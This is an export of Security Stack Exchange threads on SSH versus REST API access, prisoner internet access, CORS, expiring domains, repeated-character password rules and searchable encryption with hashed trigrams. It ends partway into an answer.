<p>SSH typically provides a powerful shell to run arbitrary commands, although what can be done with SSH could be restricted in theory (i.e. restrictive shell, execution of only specific commands, ...). Also typically no auditing is done of the activity, i.e. there is no reliable way to find out later what some user did.</p>
<p>A REST API instead usually provides limited functionality, although one might in theory also write some API which allows to execute arbitrary commands. Actions on the API are also usually logged, i.e. time and which user. One might also have different users (or tokens for automation) to get even more detailed auditing. And it might be restricted, which API calls or parameters are allowed for specific users.</p>
<p>In other words: REST API usually provides a more restrictive interface with better traceability than SSH and with more granular access control.</p>
","4"
"270079","270079","Leaving SSH access to deployed on prem server -- why is this bad?","<p>I've recently had a conversation with a colleague (in a new job for me) around access to client's servers which are deployed in their premises.</p>
<p>They have said that allowing ssh access to those servers is something that any CISO would run from, so instead to access them they have a REST API interface over https. My understanding is that public key management on SSH is at least as secure as https, so apparently my understanding is not common (or colloquially correct).</p>
<p>What are the issues I'm missing? Is this a genuine thing or concern due to key compromise attacks (which are at least as common as CA compromises).</p>
<p>NOTE: I have tried searching for the answer on the interwebs. Not found anything useful yet.</p>
","4","3","270082","<p>From my point of view you have more options there and more safe, for example.</p>
<ul>
<li><p>Having a Rest API for management operations and regular operations(a web server for buying things) is a bad idea. A DDoS or a brute force attack will impact directly on your regular users and also if you have problems of capacity then your admin operations over the HTTP interface will be affected.</p>
</li>
<li><p>Having SSH on a prod server is perfectly fine if you can afford to have different network interface, a management interface just dedicated for that.</p>
</li>
<li><p>If you can not have an SSH on a dedicated management interface then your option is fail2ban that will give you more robustness in case your SSH is listening connections from the internet.</p>
</li>
<li><p>If you server is on AWS, GCS, Azure or others then you can share the interface and then control the access in other way with Security Groups or other access service that the cloud provider gives you.</p>
</li>
</ul>
<p>Hope it clarifies your options.</p>
","1"
"270079","270079","Leaving SSH access to deployed on prem server -- why is this bad?","<p>I've recently had a conversation with a colleague (in a new job for me) around access to client's servers which are deployed in their premises.</p>
<p>They have said that allowing ssh access to those servers is something that any CISO would run from, so instead to access them they have a REST API interface over https. My understanding is that public key management on SSH is at least as secure as https, so apparently my understanding is not common (or colloquially correct).</p>
<p>What are the issues I'm missing? Is this a genuine thing or concern due to key compromise attacks (which are at least as common as CA compromises).</p>
<p>NOTE: I have tried searching for the answer on the interwebs. Not found anything useful yet.</p>
","4","3","270106","<p>I don't see a compelling argument why that REST API would necessarily be more secure.
However, that depends on <strong>implementation</strong>.</p>
<p>For instance SSH can be configured to require <strong>public key authentication</strong> and disallow password authentication.
Personally I enable SSH on the servers I manage but I only open port 22 to a few whitelisted IP addresses at firewall level (iptables, firewalld etc), that I control. So the only way to access SSH is by using one of my VPNs.</p>
<p>Do all this this and you've got a reasonably-secure setup - the <strong>attack surface</strong> is virtually nil.</p>
<p>How is access granted to that RESP API? By a user/password pair, a token, or some Oauth scheme? Note that a web service can also be restricted by using <strong>client certificates</strong>. Likewise, access to the API could be limited to certain IP addresses or address ranges, just like described above. That means access is only possible if you connect from a whitelisted location, or use VPN.</p>
<p>As you can see, the same techniques are available to both SSH and the API. The question is: <em>is anything like this in place already</em>?</p>
<p>Is there any protection against <strong>brute-force attempts</strong>? Just like Fail2ban can ban IP addresses attempting to brute-force SSH or other services. Fail2ban could also secure that API, as long as there is parseable log available.</p>
<p>All things being equal, the API limits what can be done on the server. A shell can be restricted too, but there are evasion techniques possible.</p>
<p>There may be plenty of reasons why they have that API, for example <strong>automation</strong>. But they could probably use Ansible (over SSH) as well.</p>
<p>Of course the API could have <strong>vulnerabilities</strong> too, like SQL injections, introspection attacks, you name it. APIs have been abused to <strong>exfiltrate data</strong>. Facebook, Twitter etc are testimony to that. So it could actually be an <strong>attack vector</strong> that makes the server <em>less secure</em> if it has severe design flaws (and there is no such thing as bug-free software). Whereas SSH is a mature protocol but the devil is in the <strong>implementation</strong>. Whatever you choose, you should always strive to reduce the <strong>attack surface</strong> so you have to protect the other layers as well and secure your perimeter.</p>
<p>Remaining points to consider: logging, auditing, alerting...</p>
","1"
"270066","270066","Is it possible to provide Internet to prisoners without risks of them contacting victims or accomplices as a matter of policy?","<p>By securely I mean without the risk of them committing cybercrimes or contacting victims or other people to commit more crimes ? I've read that even with firewalls a way around it could be found, especially if the allow list is large enough.</p>
<p>I was reading about how there is a restricted Internet access in Denmark and Belgium for prisoners.</p>
<p>Denmark seemed to have shut it down temporarily due to security issues.</p>
","25","3","270067","<p>Every kind of communication from inside the prison to outside the prison might cause the problems you describe, no matter if snail mail, phone calls or internet. How large the problem is depends on how restrictive the communication is and how extensively it is monitored and of course the individual motivation of prisoners to misuse this communication path.</p>
<p>Like everything in security it is a trade-off, this time between allowing prisoners a better integration into the current society where internet is an essential part on one side and the risks that such communication might be misused on the other side.</p>
<p>While it is technically possible to restrict access to only a few sites, this at the same time might make internet access practically unusable and thus does not provide the intended effects why internet was allowed in the first place.</p>
","16"
"270066","270066","Is it possible to provide Internet to prisoners without risks of them contacting victims or accomplices as a matter of policy?","<p>By securely I mean without the risk of them committing cybercrimes or contacting victims or other people to commit more crimes ? I've read that even with firewalls a way around it could be found, especially if the allow list is large enough.</p>
<p>I was reading about how there is a restricted Internet access in Denmark and Belgium for prisoners.</p>
<p>Denmark seemed to have shut it down temporarily due to security issues.</p>
","25","3","270068","<p>There is at least one specific project that I know of, <a href=""https://www.kiwix.org"" rel=""noreferrer"">Kiwix</a>, with a <a href=""https://www.kiwix.org/en/french-prisons-use-wikipedia-to-change-inmates-future/"" rel=""noreferrer"">blog post about its use in French prisons</a>.</p>
<p>The idea is to <strong><a href=""https://openzim.org/wiki/Build_your_ZIM_file#Create_a_ZIM_file_from_existing_HTML_contents"" rel=""noreferrer"">download</a> an admissible website in its entirety</strong> (into a static <a href=""https://en.wikipedia.org/wiki/ZIM_(file_format)"" rel=""noreferrer"">ZIM archive</a>), then <strong>make it available via a storage medium to offline computers</strong>.</p>
<p>The kiwix project offers a quite large set of <a href=""https://library.kiwix.org/?q="" rel=""noreferrer"">maintained archives in their library</a> including</p>
<ul>
<li>Wikipedia in many languages</li>
<li>TED talks</li>
<li>Books that are in the public domain</li>
<li>Stackexchange sites</li>
</ul>
<p>So, it's not what most users have, interactivity, but it still allows an otherwise offline population access to a part of the vast knowledge available in the internet.</p>
","47"
"270066","270066","Is it possible to provide Internet to prisoners without risks of them contacting victims or accomplices as a matter of policy?","<p>By securely I mean without the risk of them committing cybercrimes or contacting victims or other people to commit more crimes ? I've read that even with firewalls a way around it could be found, especially if the allow list is large enough.</p>
<p>I was reading about how there is a restricted Internet access in Denmark and Belgium for prisoners.</p>
<p>Denmark seemed to have shut it down temporarily due to security issues.</p>
","25","3","270084","<p>Prisoners could be given access to only a white-list of sites, sites regulators have examined closely for means of communication.  If no sites that allow user generated content are included in the white-list, there's little risk of illicit communication.  Some commenters have brought up ways that merely making page requests can be used to encode messages, but this requires the site to be in on it.  I believe the white-list solves this risk; I don't believe Encyclopedia Britannica would aide a witness intimidation plot.  It is possible, in theory, for a tech-savvy prisoner to discover an exploit on a white-listed site, but then again it's possible for a savvy prisoner to tunnel out of his cell Shawshank Redemption style.  I don't think perfect security is possible or expected.</p>
","8"
"270022","270022","Why don't browsers' same-origin policies allow anonymous cross-origin requests?","<p>Generally I've read the motivation for browser same-origin policies is to prevent data being obtained by an attacker because of the sending of credentials in a cross-origin request, and that if you're requesting entirely public data, the browser has no way of knowing that.</p>
<p>However, it does have a way of knowing whether it's sending credentials to the remote host.  Why doesn't <code>fetch</code>, for example (see <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API</a>), provide a mechanism to make a completely anonymous cross-origin request?  That would prevent an attacker getting information that may be sensitive, but would allow a script to request something like a totally public RSS feed.</p>
","2","3","270023","<p>Cookies or HTTP headers in general are just one way of transmitting credentials. It's also possible that the user's IP address is used for authentication (whether that's a good idea is a different topic).</p>
<p>The browser cannot tell how the target application works, so it would be extremely dangerous to allow unrestricted cross-origin requests based on the assumption that all content which is accessible without cookies is automatically public.</p>
<p>However, the browser can <em>ask</em> the server which cross-origin requests should be allowed under which circumstances. This is implemented through <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"" rel=""nofollow noreferrer"">Cross-Origin Resource Sharing</a>. If the target application does in fact consider all resources public which are accessed without cookies or other authentication headers, it can send the appropriate CORS headers, and the browser will give JavaScript access to those resources.</p>
","0"
"270022","270022","Why don't browsers' same-origin policies allow anonymous cross-origin requests?","<p>Generally I've read the motivation for browser same-origin policies is to prevent data being obtained by an attacker because of the sending of credentials in a cross-origin request, and that if you're requesting entirely public data, the browser has no way of knowing that.</p>
<p>However, it does have a way of knowing whether it's sending credentials to the remote host.  Why doesn't <code>fetch</code>, for example (see <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API</a>), provide a mechanism to make a completely anonymous cross-origin request?  That would prevent an attacker getting information that may be sensitive, but would allow a script to request something like a totally public RSS feed.</p>
","2","3","270024","<p>See <a href=""https://github.com/Rob--W/cors-anywhere"" rel=""nofollow noreferrer"">https://github.com/Rob--W/cors-anywhere</a> for an interesting solution to this problem.  Essentially, this is a proxy server that runs at a different domain (e.g. proxydomain.com) than the target domain (e.g. targetdomain.com) that you are trying to make the cross-origin request to.</p>
<p>To use this solution, client-side scripting served by origindomain.com would make a cross-origin request to the server at proxydomain.com.  The server at proxydomain.com forwards the request to targetdomain.com, then the proxy will return the response from targetdomain.com, adding the CORS headers necessary to relax SOP, so that client-side scripting served by origindomain.com can access the response.</p>
<p>This works around the problem, allowing the anonymous cross-origin request to targetdomain.com (albeit through proxydomain.com) without opening the door to the attack that SOP aims to prevent.  This is because the browser does not include credentials pertaining to targetdomain.com in the request, because the request is to proxydomain.com, not targetdomain.com.  But, this is fine for anonymous requests.</p>
","0"
"270022","270022","Why don't browsers' same-origin policies allow anonymous cross-origin requests?","<p>Generally I've read the motivation for browser same-origin policies is to prevent data being obtained by an attacker because of the sending of credentials in a cross-origin request, and that if you're requesting entirely public data, the browser has no way of knowing that.</p>
<p>However, it does have a way of knowing whether it's sending credentials to the remote host.  Why doesn't <code>fetch</code>, for example (see <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API</a>), provide a mechanism to make a completely anonymous cross-origin request?  That would prevent an attacker getting information that may be sensitive, but would allow a script to request something like a totally public RSS feed.</p>
","2","3","270026","<blockquote>
<p>Why don't browsers' same-origin policies allow anonymous cross-origin requests?</p>
</blockquote>
<p>They do. It is possible to send cross-origin requests using <code>&lt;img...&gt;</code> or <code>&lt;form ..&gt;</code> etc tags. One can also do this with the fetch API when setting mode to <code>no-cors</code>, which basically enforces the same restrictions as img or form tags regarding adding or manipulating critical headers.</p>
<p>Of course, one can only send the request cross-origin with no-cors but not read the response. If a cross-origin read would be allowed by default, then a script on some external site visited by a victim could fetch and then leak resources only reachable from the victims system, like resources on the internal network or resources where the access is authenticated by source IP address.</p>
<p>It might also be useful to look at the history of same-origin policy: in the beginning requests triggered from Javascript were restricted to same-origin. With CORS this restriction was carefully lifted in a way that nothing was possible by default which wasn't somehow possible before CORS already. This was done in order to not surprisingly add new security issues for applications which relied on the previously established behavior.</p>
","1"
"270013","270013","Domain about to expire. Afraid that new owners will spread malware","<p>I have a domain that is about to expire. It was used for hosting my freeware which I do not maintain anymore but can still be found on shareware directories. The application points to my domain (hardcoded) for further info.</p>
<p>What I am afraid of is that if someone buys the domain after it has expired, he/she might take advantage and repackage my application to spread malware impersonating my application. On the other hand that means that I should forever keep and pay for the domain although there's no use for it anymore, just in case the dreadful scenario happens?</p>
<p>How should I proceed ?</p>
","35","4","270015","<p>Unless your freeware is somewhat popular or used by high-value targets, its usefulness for conducting supply chain attacks is probably limited. If the domain name enjoys good SEO, I would rather expect that a speculator registers the name upon expiry and turns it into a parked page with sponsored links. More something like that.</p>
<p>If you don't renew the domain it will eventually be deleted and available to register by anyone (unless the registrar decides to keep it for themselves. This sometimes happens with valuable names).</p>
<p>My advice would be a) renew for one more (and last) year and b) update your website to state that the software is no longer supported after a certain release, and that the website will ultimately be retired. And even check that archive.org picks up the change. The idea is to signal your intent well in advance, and leave a record online.</p>
<p>And c) try to send notice to at least a few shareware directories possible, so that your application is flagged as abandoned/discontinued.</p>
<p>And perhaps make it a habit of <strong>signing code</strong> and commits with a PGP key too. Sign your code if you haven't already (<em>and sign the retirement notice as well</em>), publish your public key prominently on your website and upload it to a few key servers like <a href=""https://pgp.mit.edu/"" rel=""noreferrer"">https://pgp.mit.edu/</a> or <a href=""https://keys.openpgp.org/"" rel=""noreferrer"">https://keys.openpgp.org/</a></p>
<p>The idea here is to &quot;plant your tent&quot;, and if anybody does anything bad with your former domain name, at least they cannot sign their misdeeds under your name (PGP key).</p>
","53"
"270013","270013","Domain about to expire. Afraid that new owners will spread malware","<p>I have a domain that is about to expire. It was used for hosting my freeware which I do not maintain anymore but can still be found on shareware directories. The application points to my domain (hardcoded) for further info.</p>
<p>What I am afraid of is that if someone buys the domain after it has expired, he/she might take advantage and repackage my application to spread malware impersonating my application. On the other hand that means that I should forever keep and pay for the domain although there's no use for it anymore, just in case the dreadful scenario happens?</p>
<p>How should I proceed ?</p>
","35","4","270033","<p>Cost makes a big difference. Some people think keeping a domain means spending hundreds of dollars a year because &quot;that's what we've always paid&quot;, but that really is not the case.</p>
<p>If the domain is currently hosted somewhere (i.e., more than just basic domain registration), consider moving the domain to an inexpensive registrar and with no actual hosting. Even without anything fancy, basic registration can range from around $10 (maybe even a little less) per year to $40 or more. And with hosting could be anywhere from $20 per year to hundreds of $. If you drop everything but basic registration (maybe redirect it to another domain if you have one, that usually is no charge beyond the basic registration) then the cost is minimal. But not zero - if $10 a year is too much to spend on the domain then I recommend the other answer: Keep it for one year, track it during that time, and then decide what to do next year.</p>
","21"
"270013","270013","Domain about to expire. Afraid that new owners will spread malware","<p>I have a domain that is about to expire. It was used for hosting my freeware which I do not maintain anymore but can still be found on shareware directories. The application points to my domain (hardcoded) for further info.</p>
<p>What I am afraid of is that if someone buys the domain after it has expired, he/she might take advantage and repackage my application to spread malware impersonating my application. On the other hand that means that I should forever keep and pay for the domain although there's no use for it anymore, just in case the dreadful scenario happens?</p>
<p>How should I proceed ?</p>
","35","4","270040","<p>I wouldn't worry too much about them spreading malware on your domain unless it was fairly prominent, it just wouldn't be worth the effort.</p>
<p>What you do need to make sure of though is that any accounts registered with an email in that domain are closed down. It's quite common for expired domains to be picked up, cloud hosting passwords reset, and then huge bills wracked up in the name of the old domain owner whilst the fraudster mines crypto.</p>
","3"
"270013","270013","Domain about to expire. Afraid that new owners will spread malware","<p>I have a domain that is about to expire. It was used for hosting my freeware which I do not maintain anymore but can still be found on shareware directories. The application points to my domain (hardcoded) for further info.</p>
<p>What I am afraid of is that if someone buys the domain after it has expired, he/she might take advantage and repackage my application to spread malware impersonating my application. On the other hand that means that I should forever keep and pay for the domain although there's no use for it anymore, just in case the dreadful scenario happens?</p>
<p>How should I proceed ?</p>
","35","4","270051","<p>Is the domain popular? If it gets reasonable amount of tracking you can look for a cheap registrar and put information that software is no longer supported and place Google ADs on it. It might be enough for you to be able to pay to maintain the domain</p>
","2"
"269988","269988","Does a password policy with a restriction of repeated characters increase security?","<p>A security value called <a href=""https://www.ibm.com/docs/en/i/7.4?topic=passwords-restriction-repeated-characters-qpwdlmtrep"" rel=""noreferrer"">Restriction of Repeated Characters for Passwords (QPWDLMTREP)</a> can be configured in IBM i. If QPWDLMTREP has a value of 1, then &quot;the same character cannot be used more than once in a password, even if the repeated characters are not adjacent.
A system can be further configured such that the test for repeating characters is case-insensitive.</p>
<p>Would use of this password policy make a system more secure?</p>
","25","4","269989","<p>The answer is both 'yes' and 'no' depending on the context.</p>
<p>The intent of such a restriction is explained in the link. The consequence is that a password needs to randomly generated to be more likely to satisfy the policy. And randomly generated passwords are more secure than password people come up with to remember.</p>
<p>But...</p>
<p>The lack of repetition means that it would be easier for someone to bruteforce the random password (due to the reduced number of combinations), thereby <em>reducing</em> the benefit of the random password. But it is still more likely to produce a more secure password than one that someone could reliably remember.</p>
<p>However ...</p>
<p>If this is a password that someone needs to remember, then this creates an even bigger problem. Given research into such things, a person will either:</p>
<ul>
<li>find a password string that will satisfy the policy (which will initially be good and strong), or</li>
<li>create a &quot;keyboard pattern&quot; password</li>
</ul>
<p>But then, if it needed to be changed or refreshed, they would simply add a character (most likely), change a character to the random password, or shift the keyboard pattern up or across the keyboard. This is why we get passwords like <code>Password1</code>, <code>Password2</code>, and <code>1q2w3e4r</code> then <code>2w3e4r5t</code>, etc.</p>
<p>This means that if the password is leaked or compromised, an attacker can easily guess the password when it changes. This makes the password restriction unintentionally insecure.</p>
<p>This is one reason why the advice for years has been to encourage people to generate a strong random password (e.g. &quot;3 random words&quot;) and not to force them to change it on a schedule. People don't tend to make brand-new passwords but merely alter the existing one.</p>
<p>So...</p>
<p>Such a restriction is intended to force people to more likely create a random password, initially. But the consequence is that it can result in very insecure passwords later on.</p>
<p>The better approach is to force very, very long passwords, teach people how to create such long passwords securely and provide tools and support to make such a long password viable for practical use.</p>
","11"
"269988","269988","Does a password policy with a restriction of repeated characters increase security?","<p>A security value called <a href=""https://www.ibm.com/docs/en/i/7.4?topic=passwords-restriction-repeated-characters-qpwdlmtrep"" rel=""noreferrer"">Restriction of Repeated Characters for Passwords (QPWDLMTREP)</a> can be configured in IBM i. If QPWDLMTREP has a value of 1, then &quot;the same character cannot be used more than once in a password, even if the repeated characters are not adjacent.
A system can be further configured such that the test for repeating characters is case-insensitive.</p>
<p>Would use of this password policy make a system more secure?</p>
","25","4","269996","<p><em>In general</em>, no, such a policy is counterproductive to security. While many weak passwords use repeated characters, so do many <em>strong</em> passwords... and many weak passwords don't.</p>
<p>Some reasons not to use such a policy:</p>
<ul>
<li>It reduces the brute-force search space (though not by an amount that is really destructive for moderately long passwords)</li>
<li>It increases the risk that users will pick weak passwords that conform to the rules (e.g. qwertyuiop), when otherwise they'd use a better password generation scheme that doesn't</li>
<li>It prevents very long passwords/passphrases, if you disallow repeats at all (any <em>remotely</em> sane policy wouldn't be that draconian, though, and merely disallowing consecutive repeats doesn't have this particular problem)</li>
</ul>
<p>Ultimately, pretty much all password policies are aimed at two things:</p>
<ul>
<li>Users should use a novel, high-entropy password (one that hasn't been used before, ideally by any user on any site, and that isn't more likely to be chosen than a huge pool of other options) so that brute-force attacks (even aided by knowledge about common password strategies) don't succeed.</li>
<li>Users should use a password that can't be predicted even by a knowledgeable attacker (one that, even if the attacker knows every other password the user has ever used, they wouldn't be able to guess in reasonable time)</li>
</ul>
<p>Unfortunately, nearly every password &quot;quality&quot; requirement dating to before a few years ago - and a whole lot of them since - do <em>terrible</em> jobs of achieving these goals. Character type and repeat requirements (or restrictions) do nothing except get people to &quot;game&quot; the rules (e.g. &quot;Pa$sw0rd&quot;). Minimum length does help, but is insufficient (and you should not enforce a maximum length, unless required for technical reasons).</p>
<hr />
<p>I'm not familiar with the software you're using, so these are some <em>general</em> recommendations for attempting to enforce password quality, generally based on sources such as <a href=""https://www.nist.gov/special-publication-800-63"" rel=""noreferrer"">NIST</a>.</p>
<p>The recommended fix for the problem of novel passwords is to use a list of known passwords from elsewhere - usually collected from compromised sites that had weak password security - and reject any password on it. Some of these lists are quite long - e.g. <a href=""https://haveibeenpwned.com/Passwords"" rel=""noreferrer"">https://haveibeenpwned.com/Passwords</a> has a list of over 600 million unique compromised passwords - and site owners can and should reject any password on such a list. You might even want to try &quot;normalizing&quot; the breached password list and the users' password candidates (e.g. &quot;Pa$sw0rd&quot; -&gt; &quot;password&quot;, removing capitalization and reversing common substitutions), since you want to catch obvious modifications of passwords even if they haven't been seen in a breach yet.</p>
<p>Addressing the problem of unpredictability is harder. Generally, you end up wanting to block as much information as possible about the user, site/app, date, and any other predictable-to-an-attacker information. So, don't let users use their name, username, age, address, email address, date of birth, or any other information about themselves (to the limits of your knowledge) as part of their password. Similar, don't allow your site, app, or company name, any part of the current date, or so on. Such filters should be fairly narrow - the goal is to block anything a attacker would guess, not everything that plausibly could be related to the user - and match any part of the password, not just the start or the whole.</p>
<p>In combination with the block on compromised passwords this tends to result in fairly novel and unpredictable passwords. Combine that with expensive salted password hashing (ideally something with a high and tunable memory cost, to interfere with parallelization of brute-forcing) and ideally a second factor, and you are well on the way to strong authentication.</p>
","53"
"269988","269988","Does a password policy with a restriction of repeated characters increase security?","<p>A security value called <a href=""https://www.ibm.com/docs/en/i/7.4?topic=passwords-restriction-repeated-characters-qpwdlmtrep"" rel=""noreferrer"">Restriction of Repeated Characters for Passwords (QPWDLMTREP)</a> can be configured in IBM i. If QPWDLMTREP has a value of 1, then &quot;the same character cannot be used more than once in a password, even if the repeated characters are not adjacent.
A system can be further configured such that the test for repeating characters is case-insensitive.</p>
<p>Would use of this password policy make a system more secure?</p>
","25","4","270002","<p>I mostly wanted to add some math to the reduced search space argument. As an example, suppose passwords are generated from the 26 letters plus the 10 digits, so 36 characters and are exactly 10 characters long. Then if you allow repetitions there are $36^{10} = 3.656158e+15$ different possible passwords. If you exclude repetitions there are only $36!/26!=9.223933e+14$ different possible password. So you loose about a factor of 4 in this example.</p>
<p>If you allow more possible characters, the loss in entropy gets smaller, if the passwords are longer the loss in entropy gets bigger.</p>
<p>I think the worst case scenario for this restriction can happen for a user that has a password manager or similar software that generates long, secure, random passwords but these often fail this restriction. If the user then gives up after a few attempts and uses '12345' as their password because that satisfies this rule the well-intentioned rule had exactly the opposite of the intended effect.</p>
","6"
"269988","269988","Does a password policy with a restriction of repeated characters increase security?","<p>A security value called <a href=""https://www.ibm.com/docs/en/i/7.4?topic=passwords-restriction-repeated-characters-qpwdlmtrep"" rel=""noreferrer"">Restriction of Repeated Characters for Passwords (QPWDLMTREP)</a> can be configured in IBM i. If QPWDLMTREP has a value of 1, then &quot;the same character cannot be used more than once in a password, even if the repeated characters are not adjacent.
A system can be further configured such that the test for repeating characters is case-insensitive.</p>
<p>Would use of this password policy make a system more secure?</p>
","25","4","270027","<p>Short answer: <strong>No.</strong></p>
<h2>It reduces entropy</h2>
<p>Let's say that you want a 10-character password, selected from an alphabet of the 94 printable ASCII characters (excluding space).</p>
<p>With no restrictions on duplicated characters, there are 94<sup>10</sup> ≈ 5.386 × 10<sup>19</sup> possible passwords.  If the characters are selected truly at random, this works out to 65.546 <a href=""https://www.securitycentric.com.au/blog/bits-of-entropy-the-importance-of-complex-passwords"" rel=""nofollow noreferrer"">bits of entropy</a>.</p>
<p>With duplicates not allowed, there are P(94, 10) ≈ 3.281 × 10<sup>19</sup> possible passwords, or 64.837 bits of entropy.</p>
<p>So the restriction costs you 0.709 bit of entropy.  Admittedly, that's not a lot, but it's still a reduction.</p>
<h2>It doesn't do much to prevent the use of bad passwords</h2>
<p><a href=""https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords"" rel=""nofollow noreferrer"">In Wikipedia's list of the 10,000 most common passwords</a>, 3542 of them follow the rule of having no repeating characters.  So it wouldn't do anything to stop people from using passwords like <code>123456</code>, <code>12345678</code>, or <code>qwerty</code>.</p>
<p>True, it <em>would</em> prevent 6458 of these common passwords, including <code>password</code>, <code>111111</code>, or <code>123123</code>.  But you could accomplish the same thing by just having an explicit blacklist of bad passwords.</p>
","4"
"269960","269960","Using hashed trigrams to search over encrypted data","<p>For practice, I write let's call it a notebook app that stores users' notes in AES-encrypted form. For encryption, I use a password-based intermediate key technique as described <a href=""https://security.stackexchange.com/a/88989/292322"">here</a>. Actually, the exact encryption method doesn't matter here, just so you know that only the client has the ability to decrypt the notes.</p>
<p>I want to implement a basic search algorithm that would let users search over their notes. Obviously, you can't just encrypt the search phrase and search it over the database or something like that, so here's an idea:</p>
<p>When a user creates or updates a note, the client-side algorithm creates a list of its trigrams, filters duplicates, then hashes each one of them, and then passes it to the server where it's stored alongside the encrypted note text in the database. When hashing trigrams, the user's personal salt has to be used.</p>
<p>When searching, the same thing applies to the search phrase and the database tries to search notes by given hashed trigrams.</p>
<p>So I have a couple of questions about this idea:</p>
<ul>
<li>Would it be secure enough?</li>
<li>Would it decrease security if the hashes of trigrams get truncated to save some space? To handle collisions, the decrypted text could be checked on the client to verify it does have matches.</li>
<li>What would be more efficient?
<ul>
<li>To store trigrams of a note as string divided by spaces in a separate column, then search them with <code>LIKE</code> or <code>REGEXP</code> statement</li>
<li>Or to store them in a separate table with one row per trigram with a foreign key, and search over them with <code>=</code> operator</li>
</ul>
</li>
</ul>
<p><strong>Edit after some comments:</strong></p>
<p>To prevent brute-force, the encryption key (or even a hashed version of it) could be used as the salt for hashing trigrams. I suppose it can work because the key can only be known by client. Is it a good way to deal with it, or there are drawbacks of this approach I fail to see?</p>
<p>As I've been told that using the same string as a salt <em>and</em> as a key could be a bad idea, there's an alternative way: we generate this &quot;trigram salt&quot; when the user signs up, encrypt it with the encryption key and store it in the database, then use its decrypted form as mentioned above.</p>
","4","4","269962","<p>Hashing 3-character strings is useless, because the hash can be trivially broken with brute force (i. e. trying out all possible combinations). So your approach would effectively reveal the trigrams of the plaintext, giving an attacker the chance to systematically approximate the content.</p>
<p>I see two options:</p>
<ul>
<li>Use a hash-based message authentication code (HMAC) for the trigrams with the user's key as the HMAC key. This way, only the client can calculate HMACs from plaintext trigrams, not an attacker. When a new note is created, the client  tokenizes the note, calculates the trigram HMACs and sends the HMACs to the server, so that they can be stored in the database. When a note should be searched, the client calculates the HMACs from the search string and passes them to the server for a full text search in the database. Note that while the HMACs don't reveal the trigrams themselves, this scheme still leaks the <em>frequencies</em> of the trigrams. An attacker could try to correlate the HMACs with common trigrams of the language used in the notes (e. g. English) and find out what the notes likely contains.</li>
<li>Tokenize the text and then encrypt the entire collection of tokens with the user's key. Of course that means the full text has to be performed client-side after the user has provided the password.</li>
</ul>
","5"
"269960","269960","Using hashed trigrams to search over encrypted data","<p>For practice, I write let's call it a notebook app that stores users' notes in AES-encrypted form. For encryption, I use a password-based intermediate key technique as described <a href=""https://security.stackexchange.com/a/88989/292322"">here</a>. Actually, the exact encryption method doesn't matter here, just so you know that only the client has the ability to decrypt the notes.</p>
<p>I want to implement a basic search algorithm that would let users search over their notes. Obviously, you can't just encrypt the search phrase and search it over the database or something like that, so here's an idea:</p>
<p>When a user creates or updates a note, the client-side algorithm creates a list of its trigrams, filters duplicates, then hashes each one of them, and then passes it to the server where it's stored alongside the encrypted note text in the database. When hashing trigrams, the user's personal salt has to be used.</p>
<p>When searching, the same thing applies to the search phrase and the database tries to search notes by given hashed trigrams.</p>
<p>So I have a couple of questions about this idea:</p>
<ul>
<li>Would it be secure enough?</li>
<li>Would it decrease security if the hashes of trigrams get truncated to save some space? To handle collisions, the decrypted text could be checked on the client to verify it does have matches.</li>
<li>What would be more efficient?
<ul>
<li>To store trigrams of a note as string divided by spaces in a separate column, then search them with <code>LIKE</code> or <code>REGEXP</code> statement</li>
<li>Or to store them in a separate table with one row per trigram with a foreign key, and search over them with <code>=</code> operator</li>
</ul>
</li>
</ul>
<p><strong>Edit after some comments:</strong></p>
<p>To prevent brute-force, the encryption key (or even a hashed version of it) could be used as the salt for hashing trigrams. I suppose it can work because the key can only be known by client. Is it a good way to deal with it, or there are drawbacks of this approach I fail to see?</p>
<p>As I've been told that using the same string as a salt <em>and</em> as a key could be a bad idea, there's an alternative way: we generate this &quot;trigram salt&quot; when the user signs up, encrypt it with the encryption key and store it in the database, then use its decrypted form as mentioned above.</p>
","4","4","269963","<p>As others have mentioned, the brute force is much too easy on this scheme.</p>
<p>An option that was not previously mentioned is symmetric searchable encryption.  These schemes are also not perfect but likely better than hashed trigrams.</p>
","2"
"269960","269960","Using hashed trigrams to search over encrypted data","<p>For practice, I write let's call it a notebook app that stores users' notes in AES-encrypted form. For encryption, I use a password-based intermediate key technique as described <a href=""https://security.stackexchange.com/a/88989/292322"">here</a>. Actually, the exact encryption method doesn't matter here, just so you know that only the client has the ability to decrypt the notes.</p>
<p>I want to implement a basic search algorithm that would let users search over their notes. Obviously, you can't just encrypt the search phrase and search it over the database or something like that, so here's an idea:</p>
<p>When a user creates or updates a note, the client-side algorithm creates a list of its trigrams, filters duplicates, then hashes each one of them, and then passes it to the server where it's stored alongside the encrypted note text in the database. When hashing trigrams, the user's personal salt has to be used.</p>
<p>When searching, the same thing applies to the search phrase and the database tries to search notes by given hashed trigrams.</p>
<p>So I have a couple of questions about this idea:</p>
<ul>
<li>Would it be secure enough?</li>
<li>Would it decrease security if the hashes of trigrams get truncated to save some space? To handle collisions, the decrypted text could be checked on the client to verify it does have matches.</li>
<li>What would be more efficient?
<ul>
<li>To store trigrams of a note as string divided by spaces in a separate column, then search them with <code>LIKE</code> or <code>REGEXP</code> statement</li>
<li>Or to store them in a separate table with one row per trigram with a foreign key, and search over them with <code>=</code> operator</li>
</ul>
</li>
</ul>
<p><strong>Edit after some comments:</strong></p>
<p>To prevent brute-force, the encryption key (or even a hashed version of it) could be used as the salt for hashing trigrams. I suppose it can work because the key can only be known by client. Is it a good way to deal with it, or there are drawbacks of this approach I fail to see?</p>
<p>As I've been told that using the same string as a salt <em>and</em> as a key could be a bad idea, there's an alternative way: we generate this &quot;trigram salt&quot; when the user signs up, encrypt it with the encryption key and store it in the database, then use its decrypted form as mentioned above.</p>
","4","4","269984","<p><strong>Attacks on the described scheme</strong></p>
